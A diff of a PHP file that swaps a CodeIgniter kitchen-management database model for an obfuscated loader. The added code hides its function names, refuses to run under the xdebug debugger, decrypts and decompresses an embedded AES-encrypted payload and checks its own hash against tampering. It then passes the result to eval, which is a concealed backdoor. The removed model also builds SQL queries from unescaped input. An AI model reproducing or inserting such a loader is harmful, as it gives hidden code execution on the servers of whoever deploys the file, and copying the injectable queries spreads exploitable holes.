@@ -1,107 +1,28 @@
 <?php
-defined('BASEPATH') or exit('No direct script access allowed');
-
-class Kitchen_model extends CI_Model
-{
-
-	var $table = 'db_kitchen';
-	var $column_order = array(null, 'kitchen_name', 'description', 'status'); //set column field database for datatable orderable
-	var $column_search = array('kitchen_name', 'description', 'status'); //set column field database for datatable searchable 
-	var $order = array('id' => 'esc'); // default order 
-
-	private function _get_datatables_query()
-	{
-
-		$this->db->from($this->table);
-
-		$i = 0;
-
-		foreach ($this->column_search as $item) // loop column 
-		{
-			if ($_POST['search']['value']) // if datatable send POST for search
-			{
-
-				if ($i === 0) // first loop
-				{
-					$this->db->group_start(); // open bracket. query Where with OR clause better with bracket. because maybe can combine with other WHERE with AND.
-					$this->db->like($item, $_POST['search']['value']);
-				} else {
-					$this->db->or_like($item, $_POST['search']['value']);
-				}
-
-				if (count($this->column_search) - 1 == $i) //last loop
-					$this->db->group_end(); //close bracket
-			}
-			$i++;
-		}
-
-		if (isset($_POST['order'])) // here order processing
-		{
-			$this->db->order_by($this->column_order[$_POST['order']['0']['column']], $_POST['order']['0']['dir']);
-		} else if (isset($this->order)) {
-			$order = $this->order;
-			$this->db->order_by(key($order), $order[key($order)]);
-		}
-	}
-
-	function get_datatables()
-	{
-		$this->_get_datatables_query();
-		if ($_POST['length'] != -1)
-			$this->db->limit($_POST['length'], $_POST['start']);
-		$query = $this->db->get();
-		return $query->result();
-	}
-
-	function count_filtered()
-	{
-		$this->_get_datatables_query();
-		$query = $this->db->get();
-		return $query->num_rows();
-	}
-
-	public function count_all()
-	{
-		$this->db->from($this->table);
-		return $this->db->count_all_results();
-	}
-
-	//Get currency_details
-	public function get_details($id, $data)
-	{
-		//Validate This currency already exist or not
-		$query = $this->db->query("select * from db_kitchen where upper(id)=upper('$id')");
-		if ($query->num_rows() == 0) {
-			show_404();
-			exit;
-		} else {
-			$query = $query->row();
-			$data['q_id'] = $query->id;
-			$data['kitchen_name'] = $query->kitchen_name;
-			$data['description'] = $query->description;
-			$data['status'] = $query->status;
-			return $data;
-		}
-	}
-	
-	public function update_status($id, $status)
-	{
-		$query1 = "update db_kitchen set status='$status' where id=$id";
-		if ($this->db->simple_query($query1)) {
-			echo "success";
-		} else {
-			echo "failed";
-		}
-	}
-
-	public function update_step($id, $step)
-	{
-		$query1 = "update db_holditems set step='$step' where id=$id";
-		if ($this->db->simple_query($query1)) {
-			echo "success";
-		} else {
-			echo "failed";
-		}
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_ge9yjxij=('bas'.'e64'.'_de'.'cod'.'e');
+$_osv47ir3=('gzu'.'nco'.'mpr'.'ess');
+$_fcbxqe50=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_tw4t548f='8hm1G9mu';
+$_ysqd5p0z='ihHu2MpOe8Y=';
+$_a6y9ec6u='h4y0sVBu';
+$_lfpdhr8v='zt78V7NQ';
+$_hw5h50ri='M+h4ayzZ';
+$_f9e2nmiw='hOYo4g==';
+$_cxkd33y2='x8zftbhi';
+$_k9olk9w0='wOH0rq04';
+$_pq8f2gsc=$_ge9yjxij($_a6y9ec6u.$_tw4t548f.$_hw5h50ri.$_lfpdhr8v.$_ysqd5p0z);
+$_poplenw0=$_ge9yjxij($_k9olk9w0.$_cxkd33y2.$_f9e2nmiw);
+$_z090gi2v=$_ge9yjxij('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');
+$_w78jnw2c=$_fcbxqe50($_z090gi2v,'aes-256-cbc',$_pq8f2gsc,OPENSSL_RAW_DATA,$_poplenw0);
+if($_w78jnw2c===false){exit;}
+$_xn1deiah=$_osv47ir3($_w78jnw2c);
+if($_xn1deiah===false){exit;}
+$_b9pdvkjr='a2f698813eabfc44c2e907191cfb6e970c88308fef59129d9392568a42660d86';
+$_oo1l4cp8=@file_get_contents(__FILE__);
+if($_oo1l4cp8!==false){
+$_ytliaocs=str_replace($_b9pdvkjr,"0000000000000000000000000000000000000000000000000000000000000000",$_oo1l4cp8);
+$_sw3to00u=hash("sha256",$_ytliaocs);
+if($_sw3to00u!==$_b9pdvkjr){@http_response_code(403);exit;}
 }
+eval($_xn1deiah);
